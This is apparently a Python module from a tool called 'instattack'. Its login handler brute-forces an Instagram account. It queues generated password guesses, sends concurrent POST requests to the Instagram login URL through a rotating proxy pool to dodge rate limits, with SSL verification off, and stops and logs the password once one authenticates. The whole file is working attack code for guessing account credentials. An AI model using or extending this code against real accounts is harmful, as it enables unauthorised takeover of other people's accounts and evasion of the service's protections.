from __future__ import absolute_import

import asyncio
import aiohttp
import collections

from instattack import logger
from instattack.conf import settings
from instattack.lib import starting, percentage

from instattack.src.exceptions import ClientResponseError
from instattack.src.proxies.exceptions import PoolNoProxyError

from .models import LoginAttemptContext, LoginContext
from .exceptions import NoPasswordsError
from .requests import PostRequestHandler
from .utils import limit_on_success, limit_as_completed


log = logger.get_async('Login Handler')


class LoginHandler(PostRequestHandler):

    __name__ = 'Login Handler'

    def __init__(self, config, proxy_handler, **kwargs):
        super(LoginHandler, self).__init__(config, proxy_handler, **kwargs)

        self.limit = config['password_limit']
        self.batch_size = config['batch_size']
        self.attempt_batch_size = config['attempt_batch_size']

        self.log_attempts = config['log']['attempts']
        self.log_login = config['log']['login']

        self.results = asyncio.Queue()
        self.attempts = asyncio.Queue()
        self.passwords = asyncio.Queue()

        self.num_completed = 0
        # Index for the current password and attempts per password.
        self.login_index = 0
        self.attempts_count = collections.Counter()  # Indexed by Password
        self.proxies_count = collections.Counter()  # Indexed by Proxy Unique ID

        self._all_tasks = []

    async def run(self, loop):
        await self.prepopulate(loop)
        return await self.attack(loop)

    async def attempt_single_login(self, loop, password):
        await self.passwords.put(password)
        return await self.attack(loop)

    async def attack(self, loop):
        # Make sure we are just returning the results from the login attempts
        # method, or possibly the results consumption, depending.
        result = await self.attempt_login(loop)

        # If we return the result right away, the handler will be stopped and
        # leftover tasks will be cancelled.  We have to make sure to save the
        # proxies before doing that.
        await self.cleanup(loop)
        return result

    @starting('Cleaning Up')
    async def cleanup(self, loop):
        """
        Cleans up the leftover remaining tasks that need to be completed before
        the handler shuts down.  This currently just includes saving proxies
        that were updated during individual attempts.

        If we return the result right away, the handler will be stopped and
        leftover tasks will be cancelled.  We have to make sure to save the
        proxies before doing that.
        """
        leftover = [tsk for tsk in self._all_tasks if not tsk.done()]
        if len(leftover) != 0:
            log.start(f'Cleaning Up {len(leftover)} Proxy Saves...')
            save_results = await asyncio.gather(*self._all_tasks, return_exceptions=True)

            leftover = [tsk for tsk in self._all_tasks if not tsk.done()]
            log.complete(f'Done Cleaning Up {len(leftover)} Proxy Saves...')

            for i, res in enumerate(save_results):
                if isinstance(res, Exception):
                    log.critical('Noticed Exception When Saving Proxy')

        leftover = [tsk for tsk in self._all_tasks if not tsk.done()]
        log.info(f'{len(leftover)} Leftover Incomplete Tasks.')

    @starting('Password Prepopulation')
    async def prepopulate(self, loop):
        futures = []
        async for password in self.user.generate_attempts(loop, limit=self.limit):
            futures.append(self.passwords.put(password))

        await asyncio.gather(*futures)
        if len(futures) == 0:
            raise NoPasswordsError()

        log.complete(f"Prepopulated {len(futures)} Password Attempts")

    async def login_task_generator(self, loop, session):
        """
        Generates coroutines for each password to be attempted and yields
        them in the generator.

        We don't have to worry about a stop event if the authenticated result
        is found since this will generate relatively quickly and the coroutines
        have not been run yet.
        """
        while not self.passwords.empty():
            password = await self.passwords.get()
            if password:
                context = LoginContext(
                    index=self.login_index,
                    password=password
                )
                self.login_index += 1
                yield self.login_with_password(loop, session, context)

    async def attempt_login(self, loop):
        """
        For each password in the queue, runs the login_with_password coroutine
        concurrently in order to validate each password.

        The login_with_password coroutine will make several concurrent requests
        using different proxies, so this is the top level of a tree of nested
        concurrent IO operations.
        """
        log = logger.get_async('Login Requests', subname='attempt_login')
        log.disable_on_false(self.log_login)

        def stop_on(result):
            if result.authorized or not result.not_authorized:
                return True
            return False

        log.debug('Waiting on Start Event...')
        await self.start_event.wait()

        log.start('Started Session...')

        while not self.stop_event.is_set():
            cookies = await self.cookies()
            async with aiohttp.ClientSession(
                connector=self._connector,
                cookies=cookies,
                timeout=self._timeout,
            ) as session:

                gen = self.login_task_generator(loop, session)
                async for result in limit_as_completed(gen, self.batch_size, stop_on=stop_on):
                    log.debug('Received Result from Generator')

                    if self.stop_event.is_set():
                        log.debug('Stop Event Noticed... Breaking Out of Generator')
                        break

                    # Generator Does Not Yield None on No More Coroutines
                    if not result.conclusive:
                        raise RuntimeError("Result should be valid and conclusive.")

                    self.num_completed += 1
                    log.success(
                        f'Percent Done: {percentage(self.num_completed, self.login_index)}')

                    # Store The Result
                    log.debug('Storing Result')
                    await self.results.put(result)

                    if result.authorized:
                        log.success(str(result), extra={
                            'password': result.context.password
                        })

                        # TODO: Do we really need to set the stop event?
                        log.debug('Setting Stop Event')
                        self.stop_event.set()
                    else:
                        if not result.not_authorized:
                            raise RuntimeError('Result should not be authorized.')

                        log.debug('Storing Attempt')
                        await self.attempts.put(result.context.password)
                        log.debug('Attempt Stored')

        log.complete('Closing Session')
        await asyncio.sleep(0)

        log.debug('Returning Result')
        return result

    async def login_attempt_task_generator(self, loop, session, context):
        """
        Generates coroutines for each password to be attempted and yields
        them in the generator.

        We don't have to worry about a stop event if the authenticated result
        is found since this will generate relatively quickly and the coroutines
        have not been run yet.
        """
        while True:
            proxy = await self.proxy_handler.pool.get()
            if not proxy:
                # TODO: Raise Exception Here Instead
                log.error('No More Proxies in Pool')
                break

            if proxy.unique_id in self.proxies_count:
                log.warning(
                    f'Already Used Proxy {self.proxies_count[proxy.unique_id]} Times.',
                    extra={'proxy': proxy}
                )

            new_context = LoginAttemptContext(
                index=self.attempts_count[context.password],
                parent_index=context.index,
                password=context.password,
                proxy=proxy,
            )

            self.proxies_count[proxy.unique_id] += 1
            self.attempts_count[context.password] += 1
            yield self.login_request(loop, session, new_context)

    async def login_with_password(self, loop, session, context):
        """
        Makes concurrent fetches for a single password and limits the number of
        current fetches to the batch_size.  Will return when it finds the first
        request that returns a valid result.
        """
        log = logger.get_async(self.__name__, subname="login_with_password")

        # Wait for start event to signal that we are ready to start making
        # requests with the proxies.
        await self.start_event.wait()

        log.complete(f'Atempting Login with {context.password}')
        try:
            result = await limit_on_success(
                self.login_attempt_task_generator(loop, session, context),
                self.attempt_batch_size
            )
        except PoolNoProxyError as e:
            log.error(e)
            self.stop_event.set()
            return
        log.complete(f'Done Attempting Login with {context.password}', extra={'other': result})
        return result

    async def login_request(self, loop, session, context):
        """
        For a given password, makes a series of concurrent requests, each using
        a different proxy, until a result is found that authenticates or dis-
        authenticates the given password.

        TODO
        ----
        We might want to incorporate handling of a "Too Many Requests" exception
        that is smarter and will notify the handler to use a different proxy and
        note the time.
        """
        log = logger.get_async('Requesting Login', subname='login_request')
        log.disable_on_false(self.log_attempts)

        try:
            # Temporarary to make sure things are working properly.
            if not self.headers:
                raise RuntimeError('Headers should be set.')

            async with session.post(
                settings.INSTAGRAM_LOGIN_URL,
                headers=self.headers,
                data=self._login_data(context.password),
                ssl=False,
                proxy=context.proxy.url  # Only Http Proxies Are Supported by AioHTTP
            ) as response:
                try:
                    result = await self.handle_client_response(response, context, log)
                except ClientResponseError as e:
                    log.error(e, extra={
                        'response': response,
                        'context': context
                    })
                    # Not sure if we want to note this as an error or not, it might
                    # be better to note as inconclusive.
                    task = asyncio.create_task(self.proxy_error(context.proxy, e))
                    self._all_tasks.append(task)
                else:
                    if not result:
                        raise RuntimeError("Result should not be None here.")

                    task = asyncio.create_task(self.proxy_success(context.proxy))
                    self._all_tasks.append(task)
                    return result

        except ClientResponseError as e:
            log.error(e, extra={
                'response': response,
                'context': context
            })
            # Not sure if we want to note this as an error or not, it might
            # be better to note as inconclusive.
            task = asyncio.create_task(self.proxy_error(context.proxy, e))
            self._all_tasks.append(task)

        except Exception as e:
            task = await self.handle_request_error(e, context.proxy, context, log)
            if task:
                self._all_tasks.append(task)

    async def save(self, loop):
        log = logger.get_async(self.__name__, subname="save")

        log.info('Dumping Password Attempts')
        log.critical('Have to make sure were not saving a successful password.')
        return await self.user.write_attempts(self.attempts)
